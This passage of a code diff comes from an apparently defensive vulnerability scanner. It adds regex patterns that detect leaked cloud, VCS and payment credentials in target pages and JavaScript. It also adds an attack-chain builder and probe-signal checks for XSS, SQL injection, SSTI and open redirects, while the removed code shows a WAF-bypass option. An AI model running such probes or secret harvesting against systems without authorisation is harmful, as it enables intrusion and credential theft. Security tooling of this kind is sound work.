+                        "source": "Banner",
+                    }
+                )
                 break
-    pending = [
-        (BANNER_SIGS[name]["vendor"], BANNER_SIGS[name]["product"], ver)
-        for name, ver in detected.items()
-    ]
-    return detected, pending
+    return detected
 
 
-NVD_API = "https://services.nvd.nist.gov/rest/json/cves/2.0"
-KEV_URL = (
-    "https://www.cisa.gov/sites/default/files/feeds/"
-    "known_exploited_vulnerabilities.json"
+# ─── OSV LOOKUP ───────────────────────────────────────────────────────
+OSV_API = "https://api.osv.dev/v1/query"
+OSV_TIMEOUT = 15
+
+OSV_ECOSYSTEM_MAP = {
+    "jquery": [("npm", "jquery")],
+    "bootstrap": [("npm", "bootstrap")],
+    "react": [("npm", "react")],
+    "angular": [("npm", "@angular/core")],
+    "vue": [("npm", "vue")],
+    "lodash": [("npm", "lodash")],
+    "moment": [("npm", "moment")],
+    "wordpress": [("Packagist", "wordpress/wordpress")],
+    "drupal": [("Packagist", "drupal/drupal")],
+    "joomla": [("Packagist", "joomla/joomla-cms")],
+    "laravel": [("Packagist", "laravel/framework")],
+    "symfony": [("Packagist", "symfony/symfony")],
+    "phpunit": [("Packagist", "phpunit/phpunit")],
+    "tomcat": [("Maven", "org.apache.tomcat:tomcat")],
+    "struts": [("Maven", "org.apache.struts:struts2-core")],
+    "spring": [("Maven", "org.springframework:spring-core")],
+    "log4j": [("Maven", "org.apache.logging.log4j:log4j-core")],
+    "log4j2": [("Maven", "org.apache.logging.log4j:log4j-core")],
+    "jenkins": [("Maven", "org.jenkins-ci.main:jenkins-core")],
+    "shiro": [("Maven", "org.apache.shiro:shiro-core")],
+}
+
+
+def _osv_query(package, version, ecosystem):
+    payload = json.dumps(
+        {"package": {"name": package, "ecosystem": ecosystem}, "version": version}
+    ).encode()
+    req = urllib.request.Request(
+        OSV_API,
+        data=payload,
+        headers={"Content-Type": "application/json", "User-Agent": "cve-scanner/14.0"},
+        method="POST",
+    )
+    try:
+        with urllib.request.urlopen(
+            req, timeout=OSV_TIMEOUT, context=ssl.create_default_context()
+        ) as r:
+            return json.loads(r.read().decode())
+    except Exception:
+        return {}
+
+
+def osv_lookup(product, version):
+    if not product or not version:
+        return []
+    pairs = OSV_ECOSYSTEM_MAP.get(product.lower())
+    if not pairs:
+        return []
+    cves = []
+    seen = set()
+    for eco, pkg_name in pairs:
+        data = _osv_query(pkg_name, version, eco)
+        for v in data.get("vulns", []):
+            for alias in v.get("aliases", []):
+                if alias.startswith("CVE-") and alias not in seen:
+                    seen.add(alias)
+                    cves.append(alias)
+            vid = v.get("id", "")
+            if vid.startswith("CVE-") and vid not in seen:
+                seen.add(vid)
+                cves.append(vid)
+    return cves
+
+
+# ─── SECRETS SCANNER ──────────────────────────────────────────────────
+SECRET_RULES = [
+    ("aws-access-key", "cloud", r"\bAKIA[0-9A-Z]{16}\b", 3.0),
+    ("aws-secret", "cloud", r"(?i)aws[_\- ]?secret[_\- ]?access[_\- ]?key\s*[:=]\s*[\"']?([0-9A-Za-z/+]{40})", 3.5),
+    ("github-pat", "vcs", r"\bghp_[0-9A-Za-z]{36}\b", 3.0),
+    ("github-oauth", "vcs", r"\bgho_[0-9A-Za-z]{36}\b", 3.0),
+    ("github-app", "vcs", r"\b(?:ghu|ghs)_[0-9A-Za-z]{36}\b", 3.0),
+    ("gitlab-pat", "vcs", r"\bglpat-[0-9A-Za-z_\-]{20}\b", 3.0),
+    ("slack-token", "chat", r"\bxox[baprs]-[0-9A-Za-z\-]{10,48}\b", 2.5),
+    ("google-api-key", "cloud", r"\bAIza[0-9A-Za-z_\-]{35}\b", 3.0),
+    ("stripe-key", "payment", r"\b(?:sk|rk)_(?:live|test)_[0-9A-Za-z]{24,}\b", 3.0),
+    ("sendgrid-key", "email", r"\bSG\.[0-9A-Za-z_\-]{22}\.[0-9A-Za-z_\-]{43}\b", 3.5),
+    ("twilio-key", "sms", r"\bSK[0-9a-fA-F]{32}\b", 3.0),
+    ("jwt", "auth", r"\beyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\b", 3.0),
+    ("private-key", "key", r"-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----", 0.0),
+    ("generic-secret", "generic", r"(?i)(?:api[_-]?key|apikey|secret|token|password)\s*[:=]\s*[\"']([0-9A-Za-z_\-]{16,64})[\"']", 3.5),
+]
+
+_SECRET_FP = (
+    "example", "sample", "dummy", "changeme", "placeholder",
+    "your_", "xxxx", "test_", "fake", "redacted",
 )
-EPSS_API = "https://api.first.org/data/v1/epss"
+
+JS_SRC_RE = re.compile(r"<script[^>]+src=[\"']([^\"']+)[\"']", re.I)
 
 
-def _default_cache_dir():
-    xdg = os.environ.get("XDG_CACHE_HOME")
-    if xdg:
-        return Path(xdg) / "cve_scanner"
-    if sys.platform == "win32":
-        local = os.environ.get("LOCALAPPDATA")
-        if local:
-            return Path(local) / "cve_scanner"
-    return Path.home() / ".cache" / "cve_scanner"
+def _shannon_entropy(s):
+    if not s:
+        return 0.0
+    freq = {}
+    for ch in s:
+        freq[ch] = freq.get(ch, 0) + 1
+    n = len(s)
+    ent = 0.0
+    for c in freq.values():
+        p = c / n
+        ent -= p * math.log2(p)
+    return ent
 
 
-CACHE_DIR = _default_cache_dir()
-try:
-    CACHE_DIR.mkdir(parents=True, exist_ok=True)
-except OSError as _cache_err:
-    err(f"Cache dir {CACHE_DIR} unavailable: {_cache_err}")
-    CACHE_DIR = Path.cwd() / ".cve_scanner_cache"
-    try:
-        CACHE_DIR.mkdir(parents=True, exist_ok=True)
-    except OSError as _cache_err2:
-        err(f"Fallback cache dir unavailable: {_cache_err2} (caching disabled)")
-        CACHE_DIR = None
-
-_NVD_LOCK = threading.Lock()
-_NVD_TIMES = []
-_NVD_WINDOW = 30.0
-_NVD_MAX_IN_WINDOW = 5
+def _redact(s):
+    if len(s) <= 8:
+        return "*" * len(s)
+    return s[:4] + "..." + s[-2:]
 
 
-def _nvd_wait():
-    while True:
-        with _NVD_LOCK:
-            now = time.monotonic()
-            cutoff = now - _NVD_WINDOW
-            while _NVD_TIMES and _NVD_TIMES[0] < cutoff:
-                _NVD_TIMES.pop(0)
-            if len(_NVD_TIMES) < _NVD_MAX_IN_WINDOW:
-                _NVD_TIMES.append(now)
-                return
-            sleep_for = _NVD_TIMES[0] + _NVD_WINDOW - now + 0.05
-        if sleep_for > 0:
-            time.sleep(sleep_for)
-
-
-def _load_cache(name, max_age=24):
-    if CACHE_DIR is None:
-        return None
-    p = CACHE_DIR / f"{name}.json"
-    if not p.exists():
-        return None
-    if (time.time() - p.stat().st_mtime) / 3600 > max_age:
-        return None
-    try:
-        return json.loads(p.read_text(encoding="utf-8"))
-    except Exception:
-        return None
-
-
-def _save_cache(name, data):
-    if CACHE_DIR is None:
-        return
-    try:
-        (CACHE_DIR / f"{name}.json").write_text(
-            json.dumps(data), encoding="utf-8"
-        )
-    except Exception:
-        pass
-
-
-def fetch_kev():
-    c = _load_cache("kev", 12)
-    if c:
-        return c
-    try:
-        data = get_json(KEV_URL)
-        kev = {v["cveID"]: v for v in data.get("vulnerabilities", [])}
-        _save_cache("kev", kev)
-        return kev
-    except Exception:
-        return {}
-
-
-def fetch_epss(cve_ids):
-    if not cve_ids:
-        return {}
-    out = {}
-    for i in range(0, len(cve_ids), 50):
-        try:
-            data = get_json(EPSS_API, params={"cve": ",".join(cve_ids[i : i + 50])})
-            for it in data.get("data", []):
-                out[it["cve"]] = float(it.get("epss", 0.0))
-        except Exception:
-            continue
+def scan_secrets(text, source, limit=25):
+    out = []
+    if not text:
+        return out
+    for rule_id, category, pattern, min_entropy in SECRET_RULES:
+        for m in re.finditer(pattern, text):
+            value = m.group(1) if m.lastindex else m.group(0)
+            low = value.lower()
+            if any(fp in low for fp in _SECRET_FP):
+                continue
+            if len(set(value)) <= 3:
+                continue
+            if min_entropy > 0 and _shannon_entropy(value) < min_entropy:
+                continue
+            out.append(
+                {
+                    "source": source,
+                    "rule": rule_id,
+                    "category": category,
+                    "entropy": round(_shannon_entropy(value), 2),
+                    "match": _redact(value),
+                    "offset": m.start(),
+                }
+            )
+            if len(out) >= limit:
+                return out
     return out
 
 
-def fetch_nvd_cve(cve_id, retry=0):
-    cached = _load_cache(f"nvd-{cve_id}", 168)
-    if cached is not None:
-        return cached
-    _nvd_wait()
-    try:
-        data = get_json(NVD_API, params={"cveId": cve_id})
-        vs = data.get("vulnerabilities", [])
-        entry = vs[0]["cve"] if vs else None
-        if entry is not None:
-            _save_cache(f"nvd-{cve_id}", entry)
-        return entry
-    except urllib.error.HTTPError as e:
-        if e.code == 429 and retry < 3:
-            time.sleep(30 * (2**retry))
-            return fetch_nvd_cve(cve_id, retry + 1)
-        return None
-    except Exception:
-        if retry < 3:
-            time.sleep(2**retry)
-            return fetch_nvd_cve(cve_id, retry + 1)
-        return None
+def _find_js_urls(html, base_url, limit):
+    base = urllib.parse.urlparse(base_url)
+    seen, out = set(), []
+    for m in JS_SRC_RE.finditer(html or ""):
+        u = urljoin(base_url, m.group(1))
+        p = urllib.parse.urlparse(u)
+        if p.netloc and p.netloc != base.netloc:
+            continue
+        if u in seen:
+            continue
+        seen.add(u)
+        out.append(u)
+        if len(out) >= limit:
+            break
+    return out
 
 
-def fetch_nvd_cpe(vendor, product, version, retry=0):
-    safe = re.sub(r"[^\w.-]+", "_", f"cpe-{vendor}-{product}-{version}")[:80]
-    cached = _load_cache(safe, 168)
-    if cached is not None:
-        return cached
-    _nvd_wait()
-    try:
-        data = get_json(
-            NVD_API,
-            params={
-                "cpeName": (
-                    f"cpe:2.3:a:{vendor}:{product}:{version}:*:*:*:*:*:*:*"
-                ),
-                "resultsPerPage": 50,
-            },
-        )
-        _save_cache(safe, data)
-        return data
-    except urllib.error.HTTPError as e:
-        if e.code == 429 and retry < 3:
-            time.sleep(30 * (2**retry))
-            return fetch_nvd_cpe(vendor, product, version, retry + 1)
-        return {}
-    except Exception:
-        return {}
+def _scan_target_secrets(target, url, page, sess):
+    sources = []
+    if page is not None:
+        sources.append((url, page.text or ""))
+    if SCAN_SECRETS_JS and page is not None:
+        for js_url in _find_js_urls(page.text, url, MAX_JS_FILES):
+            r = sess.get(js_url, timeout=PROBE_TIMEOUT, allow_redirects=True)
+            if r is not None and r.text:
+                sources.append((js_url, r.text[:524288]))
+    found = []
+    for src_url, body in sources:
+        for hit in scan_secrets(body, src_url):
+            hit["target"] = target
+            found.append(hit)
+    return found
 
 
-def extract_cvss(nvd):
-    m = nvd.get("metrics", {})
-    for k in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV40", "cvssMetricV2"):
-        if k in m and m[k]:
-            try:
-                return float(m[k][0]["cvssData"]["baseScore"])
-            except (KeyError, TypeError, ValueError):
-                pass
+# ─── ATTACK CHAIN BUILDER ─────────────────────────────────────────────
+ROLE_KEYWORDS = [
+    ("path traversal", "file_access"),
+    ("file read", "file_access"),
+    ("auth bypass", "access_escalation"),
+    ("broken access", "access_escalation"),
+    ("rce", "code_exec"),
+    ("command injection", "code_exec"),
+    ("deserialization", "code_exec"),
+    ("ssti", "code_exec"),
+    ("shellshock", "code_exec"),
+    ("backdoor", "code_exec"),
+    ("sqli", "data_access"),
+    ("sql injection", "data_access"),
+    ("xxe", "data_access"),
+    ("ssrf", "internal_access"),
+    ("env leak", "credential_theft"),
+    ("bleed", "credential_theft"),
+]
+
+CWE_ROLES = {
+    "CWE-22": "file_access", "CWE-78": "code_exec", "CWE-79": "exposure",
+    "CWE-89": "data_access", "CWE-90": "data_access", "CWE-94": "code_exec",
+    "CWE-113": "exposure", "CWE-502": "code_exec", "CWE-601": "exposure",
+    "CWE-611": "data_access", "CWE-643": "data_access", "CWE-918": "internal_access",
+    "CWE-943": "data_access", "CWE-1321": "exposure",
+}
+
+ROLE_TRANSITIONS = {
+    ("information_theft", "access_escalation"): "credential_reuse",
+    ("information_theft", "internal_access"): "recon_to_ssrf",
+    ("internal_access", "code_exec"): "SSRF to RCE",
+    ("file_access", "code_exec"): "LFI to RCE",
+    ("file_access", "information_theft"): "source_disclosure",
+    ("data_access", "information_theft"): "data_exfiltration",
+    ("data_access", "access_escalation"): "credential_extraction",
+    ("access_escalation", "code_exec"): "privileged_execution",
+    ("access_escalation", "data_access"): "admin_data_access",
+    ("credential_theft", "access_escalation"): "credential_to_bypass",
+    ("credential_theft", "internal_access"): "credential_to_pivot",
+    ("exposure", "access_escalation"): "misconfig_to_bypass",
+    ("exposure", "file_access"): "disclosure_to_traversal",
+    ("code_exec", "data_access"): "rce_to_exfil",
+}
+
+
+def _finding_role(record):
+    if record.get("test_type") == "secret":
+        return "credential_theft"
+    cwe = record.get("cwe_id")
+    if cwe and cwe in CWE_ROLES:
+        return CWE_ROLES[cwe]
+    label = (record.get("label") or "").lower()
+    for kw, role in ROLE_KEYWORDS:
+        if kw in label:
+            return role
     return None
 
 
-def extract_cwe(nvd):
-    out = []
-    for w in nvd.get("weaknesses", []):
-        for d in w.get("description", []):
-            v = d.get("value", "")
-            if v.startswith("CWE-") and v not in out:
-                out.append(v)
-    return out
+def _finding_id(record):
+    if record.get("test_type") == "secret":
+        return "secret:" + record.get("rule", "?")
+    return record.get("cve_id") or record.get("cwe_id") or record.get("endpoint", "?")
 
 
-def cpe_lookup(vendor, product, version):
-    data = fetch_nvd_cpe(vendor, product, version)
-    if not data:
-        return []
-    out = []
-    for v in data.get("vulnerabilities", []):
-        cve = v.get("cve", {})
-        cid = cve.get("id")
-        if not cid:
+def _build_chains(records, max_links=3, max_chains=MAX_CHAINS):
+    nodes, seen_ids = [], set()
+    for r in records:
+        if r.get("result") != "CONFIRMED":
             continue
-        matched = False
-        for cfg in cve.get("configurations", []):
-            for node in cfg.get("nodes", []):
-                for m in node.get("cpeMatch", []):
-                    if not m.get("vulnerable"):
-                        continue
-                    if f":{vendor}:{product}:" not in m.get("criteria", ""):
-                        continue
-                    si = m.get("versionStartIncluding")
-                    se = m.get("versionStartExcluding")
-                    ei = m.get("versionEndIncluding")
-                    ee = m.get("versionEndExcluding")
-                    if si or se or ei or ee:
-                        if vrange(version, si, se, ei, ee):
-                            matched = True
-                    else:
-                        parts = m["criteria"].split(":")
-                        if len(parts) > 5 and parts[4] == version:
-                            matched = True
-                    if matched:
-                        break
-                if matched:
-                    break
-            if matched:
-                break
-        if not matched:
+        role = _finding_role(r)
+        if not role:
             continue
-        cvss = extract_cvss(cve)
-        cwes = extract_cwe(cve)
-        descs = cve.get("descriptions") or [{}]
-        out.append(
-            {
-                "cve_id": cid,
-                "package": product,
-                "version": version,
-                "ecosystem": "CPE",
-                "cwe": cwes,
-                "cvss": cvss,
-                "summary": (descs[0] or {}).get("value", "")[:300],
-                "source": "CPE",
-                "in_kev": False,
-                "epss": 0.0,
-                "priority": "HIGH" if (cvss or 0) >= 7.0 else "MEDIUM",
-                "false_positive_status": "NEEDS_REVIEW",
-                "false_positive_reason": f"Detected {vendor}/{product} {version}",
-            }
-        )
-    return out
+        nid = _finding_id(r)
+        if nid in seen_ids:
+            continue
+        seen_ids.add(nid)
+        nodes.append({"id": nid, "role": role, "record": r})
+
+    adj = {}
+    for a in nodes:
+        for b in nodes:
+            if a["id"] == b["id"]:
+                continue
+            label = ROLE_TRANSITIONS.get((a["role"], b["role"]))
+            if label:
+                adj.setdefault(a["id"], []).append((b, label))
+
+    out = []
+
+    def walk(path, transitions):
+        if len(path) >= max_links or len(out) >= max_chains:
+            return
+        for nxt, label in adj.get(path[-1]["id"], []):
+            if any(p["id"] == nxt["id"] for p in path):
+                continue
+            new_path = path + [nxt]
+            new_tr = transitions + [label]
+            if len(new_path) >= 2:
+                final_role = new_path[-1]["role"]
+                combined = "CRITICAL" if final_role in ("code_exec", "access_escalation") else "HIGH"
+                out.append(
+                    {
+                        "name": new_tr[-1],
+                        "links": [
+                            {
+                                "finding": l["id"],
+                                "role": l["role"],
+                                "label": l["record"].get("label", ""),
+                                "endpoint": l["record"].get("endpoint")
+                                or l["record"].get("source", ""),
+                            }
+                            for l in new_path
+                        ],
+                        "transitions": new_tr,
+                        "combined_severity": combined,
+                        "description": " -> ".join(p["id"] for p in new_path),
+                    }
+                )
+            walk(new_path, new_tr)
+
+    for n in nodes:
+        walk([n], [])
+        if len(out) >= max_chains:
+            break
+    return out[:max_chains]
 
 
-def assess_fp(f):
-    v = f.get("verification")
-    if v:
-        s = v.get("status")
-        fp = v.get("fp_status")
-        if s == "CONFIRMED":
-            return ("CONFIRMED", v.get("evidence", "Active PoC confirmed"))
-        if s == "WAF_BLOCKED":
-            return ("UNVERIFIED", v.get("evidence", "Blocked by WAF"))
-        if s == "NOT_REPRODUCED":
-            return (
-                fp or "LIKELY_FALSE_POSITIVE",
-                v.get("evidence", "PoC did not trigger"),
-            )
-    if f.get("source") in ("PortScan", "Banner", "HTTP"):
-        return ("CONFIRMED", f.get("summary", "Observed on target"))
-    if f.get("in_kev"):
-        return ("CONFIRMED", "Listed in CISA KEV")
-    cid = f.get("cve_id")
-    if not cid:
-        return ("LIKELY_FALSE_POSITIVE", "No CVE assigned")
-    epss = f.get("epss", 0.0) or 0.0
-    if epss >= 0.1:
-        return ("LIKELY_REAL", f"High EPSS ({epss:.2%})")
-    cvss = f.get("cvss")
-    if cvss is not None and cvss >= 7.0:
-        return ("LIKELY_REAL", f"High CVSS ({cvss})")
-    if cvss is not None:
-        return ("NEEDS_REVIEW", f"CVE assigned, CVSS {cvss}")
-    return ("NEEDS_REVIEW", "CVE assigned, no CVSS/EPSS")
+# ─── SIGNAL DETECTION ─────────────────────────────────────────────────
+def _signal_xss(exploit, baseline, probe):
+    for marker in probe.get("markers", []):
+        if marker in exploit.text and marker not in baseline.text:
+            return True, f"marker {marker!r} reflected"
+    hits = sig_match(exploit.text, XSS_SIGS, baseline.text)
+    if hits:
+        return True, f"XSS sigs: {hits}"
+    return False, "no reflection"
 
 
-def enrich(findings):
-    if not findings:
-        return findings
-    ids = sorted({f["cve_id"] for f in findings if f.get("cve_id")})
-    info(f"Enriching {len(findings)} findings ({len(ids)} unique CVEs)...")
-    epss_map = fetch_epss(ids)
-    kev_map = fetch_kev()
-    nvd_cache = {}
-    if ids:
-        with ThreadPoolExecutor(max_workers=4) as ex:
-            for cid, entry in zip(ids, ex.map(fetch_nvd_cve, ids)):
-                nvd_cache[cid] = entry
-    for f in findings:
-        cid = f.get("cve_id")
-        epss = epss_map.get(cid, 0.0) if cid else 0.0
-        in_kev = bool(cid and cid in kev_map)
-        cvss, nvd_cwe = None, []
-        entry = nvd_cache.get(cid) if cid else None
-        if entry:
-            cvss = extract_cvss(entry)
-            nvd_cwe = extract_cwe(entry)
-        merged = sorted(set((f.get("cwe") or []) + nvd_cwe))
-        if in_kev:
-            priority = "CRITICAL"
-        elif epss >= 0.1:
-            priority = "HIGH"
-        elif cvss is not None and cvss >= 7.0:
-            priority = "HIGH"
-        elif cvss is not None and cvss >= 4.0:
-            priority = "MEDIUM"
-        elif cid:
-            priority = "LOW"
-        else:
-            priority = "INFO"
-        f.update(
-            {
-                "cwe": merged,
-                "cvss": cvss,
-                "epss": round(epss, 4),
-                "in_kev": in_kev,
-                "priority": priority,
-            }
-        )
-        f["false_positive_status"], f["false_positive_reason"] = assess_fp(f)
-    return findings
+def _signal_sql_rce(exploit, baseline, probe, ex_txt, bl_txt):
+    delta = exploit.elapsed_seconds - baseline.elapsed_seconds
+    threshold = probe.get("timing_threshold", 3.0)
+    if delta >= threshold:
+        return True, f"timing delta {delta:.1f}s"
+    mode = probe["detect"]
+    sigs = SQL_SIGS if mode == "sql" else RCE_SIGS
+    hits = sig_match(ex_txt, sigs, bl_txt)
+    if hits:
+        return True, f"{mode.upper()} sigs: {hits}"
+    return False, "no signal"
 
 
+def _signal_pattern(probe, ex_txt, bl_txt):
+    hits = sig_match(ex_txt, probe.get("signatures", {}), bl_txt)
+    if hits:
+        return True, f"signatures: {hits}"
+    return False, "no signal"
+
+
+def _signal_ssti(exploit, baseline, probe, ex_txt, bl_txt):
+    expected = probe.get("expected", "")
+    if expected and expected in exploit.text and expected not in baseline.text:
+        return True, f"SSTI evaluated -> {expected}"
+    hits = sig_match(ex_txt, SSTI_SIGS, bl_txt)
+    if hits:
+        return True, f"SSTI sigs: {hits}"
+    return False, "no signal"
+
+
+def _signal_redirect(exploit, probe, ex_txt, bl_txt):
+    location = exploit.header("Location")
+    expected = probe.get("expected", "evil.example.com")
+    if expected in location:
+        return True, f"redirects to {location}"
+    hits = sig_match(ex_txt, REDIR_SIGS, bl_txt)
+    if hits:
+        return True, f"redirect sigs: {hits}"
+    return False, "no redirect"
+
+
+def signal(exploit, baseline, payload, probe):
+    if exploit is None or baseline is None:
+        return False, "request failed"
+    mode = probe["detect"]
+    ex_txt = resp_blob(exploit)
+    bl_txt = resp_blob(baseline)
+    if mode == "xss_reflection":
+        return _signal_xss(exploit, baseline, probe)
+    if mode in ("sql", "rce"):
+        return _signal_sql_rce(exploit, baseline, probe, ex_txt, bl_txt)
+    if mode == "pattern":
+        return _signal_pattern(probe, ex_txt, bl_txt)
+    if mode == "ssti":
+        return _signal_ssti(exploit, baseline, probe, ex_txt, bl_txt)
+    if mode == "redirect":
+        return _signal_redirect(exploit, probe, ex_txt, bl_txt)
+    return False, f"unknown mode {mode}"
+
+
+# ─── INJECTION POINTS ─────────────────────────────────────────────────
 FORM_RE = re.compile(r"<form\b[^>]*>(.*?)</form>", re.I | re.S)
 NAME_RE = re.compile(r"name=[\"']([^\"']+)", re.I)
 ACT_RE = re.compile(r"action=[\"']?([^\"'\s>]+)", re.I)
@@ -1547,11 +1857,8 @@ def injection_points(html, base_url):
 
     q = urllib.parse.urlparse(base_url).query
     if q:
-        add(
-            base_url,
-            "GET",
-            list(urllib.parse.parse_qs(q, keep_blank_values=True).keys()),
-        )
+        add(base_url, "GET",
+            list(urllib.parse.parse_qs(q, keep_blank_values=True).keys()))
     for fm in FORM_RE.finditer(html):
         outer = fm.group(0)
         inner = fm.group(1)
@@ -1565,11 +1872,12 @@ def injection_points(html, base_url):
     return pts
 
 
+# ─── RATE LIMITER ─────────────────────────────────────────────────────
 class RateLimiter:
     def __init__(self, rate=0.0, jitter=0.0):
         self.rate = rate
         self.jitter = jitter
-        self._last = 0.0
+        self._last = time.monotonic()
 
     def wait(self):
         if self.rate <= 0:
@@ -1580,112 +1888,21 @@ class RateLimiter:
             time.sleep(gap - el)
         if self.jitter > 0:
             import random
-
             time.sleep(self.jitter * (0.5 + 0.5 * random.random()))
         self._last = time.monotonic()
 
 
-def signal(exploit, baseline, payload, probe):
-    if exploit is None or baseline is None:
-        return False, "request failed"
-    mode = probe["detect"]
-    ex_txt = resp_blob(exploit)
-    bl_txt = resp_blob(baseline)
-
-    if mode == "xss_reflection":
-        for m in probe.get("markers", []):
-            if m in exploit.text and m not in baseline.text:
-                return True, f"marker {m!r} reflected"
-        hits = sig_match(exploit.text, XSS_SIGS, baseline.text)
-        if hits:
-            return True, f"XSS sigs: {hits}"
-        return False, "no reflection"
-
-    if mode in ("sql", "rce"):
-        d = exploit.elapsed_seconds - baseline.elapsed_seconds
-        if d >= probe.get("timing_threshold", 3.0):
-            return True, f"timing delta {d:.1f}s"
-        sigs = SQL_SIGS if mode == "sql" else RCE_SIGS
-        hits = sig_match(ex_txt, sigs, bl_txt)
-        if hits:
-            return True, f"{mode.upper()} sigs: {hits}"
-        return False, "no signal"
-
-    if mode == "pattern":
-        hits = sig_match(ex_txt, probe.get("signatures", {}), bl_txt)
-        if hits:
-            return True, f"signatures: {hits}"
-        return False, "no signal"
-
-    if mode == "ssti":
-        e = probe.get("expected", "")
-        if e and e in exploit.text and e not in baseline.text:
-            return True, f"SSTI evaluated -> {e}"
-        hits = sig_match(ex_txt, SSTI_SIGS, bl_txt)
-        if hits:
-            return True, f"SSTI sigs: {hits}"
-        return False, "no signal"
-
-    if mode == "redirect":
-        loc = exploit.headers.get("Location", "")
-        if probe.get("expected", "evil.example.com") in loc:
-            return True, f"redirects to {loc}"
-        hits = sig_match(ex_txt, REDIR_SIGS, bl_txt)
-        if hits:
-            return True, f"redirect sigs: {hits}"
-        return False, "no redirect"
-    return False, f"unknown mode {mode}"
-
-
-def verify_cve(target_url, cve_id, sess, limiter):
-    cve_id = cve_id.upper()
-    probe = CVE_PROBES.get(cve_id)
-    if not probe:
+# ─── PROBE HELPERS ────────────────────────────────────────────────────
+def _resp_summary(r, body_limit):
+    if r is None:
         return None
-    baseline = sess.get(target_url, timeout=15, allow_redirects=False)
-    if baseline is None:
-        return {"status": "UNVERIFIED", "reason": "Cannot reach target"}
-    bl_blob = resp_blob(baseline)
-    blocks = 0
-    for p in probe["probes"]:
-        url = urljoin(target_url, p.get("path", "/"))
-        limiter.wait()
-        ex = sess.request(
-            p.get("method", "GET"),
-            url,
-            data=p.get("data"),
-            headers=p.get("headers"),
-            json_body=p.get("json_body"),
-        )
-        if ex is None:
-            continue
-        if is_blocked(ex) and not is_blocked(baseline):
-            if detect_waf(ex.status_code, ex.headers, ex.text):
-                blocks += 1
-                continue
-        rs = p.get("require_status")
-        if rs and ex.status_code not in rs:
-            continue
-        hits = sig_match(resp_blob(ex), p.get("sig", {}), bl_blob)
-        if hits:
-            return {
-                "status": "CONFIRMED",
-                "fp_status": "CONFIRMED",
-                "method": f"{cve_id} {probe['label']}",
-                "evidence": f"{url}: {hits}",
-            }
-    if blocks:
-        return {
-            "status": "WAF_BLOCKED",
-            "fp_status": "UNVERIFIED",
-            "method": f"{cve_id} {probe['label']}",
-            "evidence": f"{blocks} request(s) blocked by WAF",
-        }
+    text = r.text or ""
     return {
-        "status": "NOT_REPRODUCED",
-        "fp_status": "NEEDS_REVIEW",
-        "method": f"{cve_id} {probe['label']}",
-        "evidence": f"Probes did not trigger ({len(probe['probes'])} endpoint(s))",
+        "status_code": r.status_code,
+        "elapsed_ms": round(r.elapsed_seconds * 1000, 1),
+        "headers": dict(r.headers),
+        "body_excerpt": text[:body_limit],
+        "body_length": len(text),
     }
 
 
@@ -1693,162 +1910,165 @@ def _send_pt(sess, pt, values, limiter, allow_redirects=False):
     limiter.wait()
     if pt["method"] == "GET":
         return sess.request(
-            "GET", pt["url"], params=values, allow_redirects=allow_redirects
+            "GET", pt["url"], params=values,
+            allow_redirects=allow_redirects, timeout=PROBE_TIMEOUT,
         )
     return sess.request(
-        pt["method"], pt["url"], data=values, allow_redirects=allow_redirects
+        pt["method"], pt["url"], data=values,
+        allow_redirects=allow_redirects, timeout=PROBE_TIMEOUT,
     )
 
 
-def verify_cwe(target_url, cwe, sess, limiter, waf_bypass):
-    probe = CWE_PROBES.get(cwe)
-    if not probe:
-        return None
-    page = sess.get(target_url, timeout=15, allow_redirects=True)
-    if page is None:
-        return {"status": "UNVERIFIED", "reason": "Cannot fetch target"}
-    pts = injection_points(page.text, target_url)
-    if not pts:
-        return {"status": "UNVERIFIED", "reason": "No parameters found"}
-    info(
-        f"    {probe['label']}: {len(pts)} point(s) x {len(probe['payloads'])} payload(s)"
+def _cve_attempt(target, url, cve_id, label, p, sess, limiter, baseline, bl_blob):
+    probe_url = urljoin(url, p.get("path", "/"))
+    method = p.get("method", "GET")
+    req_headers = dict(p.get("headers") or {})
+    req_body = p.get("data")
+    if p.get("json_body") is not None:
+        req_body = json.dumps(p["json_body"])
+        req_headers.setdefault("Content-Type", "application/json")
+    limiter.wait()
+    ex = sess.request(
+        method, probe_url,
+        data=p.get("data"), headers=p.get("headers"),
+        json_body=p.get("json_body"), timeout=PROBE_TIMEOUT,
     )
-    baselines = {}
-
-    def baseline_of(pt):
-        k = (pt["url"], pt["method"], tuple(sorted(pt["params"])))
-        if k not in baselines:
-            baselines[k] = _send_pt(
-                sess, pt, {p: "safe_test_123" for p in pt["params"]}, limiter
-            )
-        return baselines[k]
-
-    blocks = 0
-    for payload in probe["payloads"]:
-        variants = obfuscate(payload) if waf_bypass else [payload]
-        for variant in variants:
-            for pt in pts:
-                baseline = baseline_of(pt)
-                ex = _send_pt(sess, pt, {p: variant for p in pt["params"]}, limiter)
-                if ex and is_blocked(ex) and not is_blocked(baseline):
-                    if detect_waf(ex.status_code, ex.headers, ex.text):
-                        blocks += 1
-                        continue
-                vuln, why = signal(ex, baseline, variant, probe)
-                if vuln:
-                    return {
-                        "status": "CONFIRMED",
-                        "fp_status": "CONFIRMED",
-                        "method": f"{probe['label']} PoC",
-                        "evidence": (
-                            f"{pt['url']} ({pt['method']}, "
-                            f"params={pt['params']}): {why}"
-                        ),
-                    }
-    if blocks:
-        return {
-            "status": "WAF_BLOCKED",
-            "fp_status": "UNVERIFIED",
-            "method": f"{probe['label']} PoC",
-            "evidence": f"{blocks} request(s) blocked",
-        }
+    result = "NOT_REPRODUCED"
+    evidence = ""
+    if ex is None:
+        result = "ERROR"
+        evidence = "request failed"
+    elif (
+        is_blocked(ex) and not is_blocked(baseline)
+        and detect_waf(ex.status_code, ex.headers, ex.text)
+    ):
+        result = "WAF_BLOCKED"
+        evidence = "blocked by WAF"
+    else:
+        require = p.get("require_status")
+        if require and ex.status_code not in require:
+            evidence = f"status {ex.status_code} not in {require}"
+        else:
+            hits = sig_match(resp_blob(ex), p.get("sig", {}), bl_blob)
+            if hits:
+                result = "CONFIRMED"
+                evidence = f"matched signatures: {hits}"
+    body_limit = (
+        RESPONSE_EXCERPT_CONFIRMED
+        if result in ("CONFIRMED", "WAF_BLOCKED")
+        else RESPONSE_EXCERPT_OTHER
+    )
     return {
-        "status": "NOT_REPRODUCED",
-        "fp_status": "LIKELY_FALSE_POSITIVE",
-        "method": f"{probe['label']} PoC",
-        "evidence": "Payloads did not trigger",
+        "target": target, "test_type": "cve", "cve_id": cve_id,
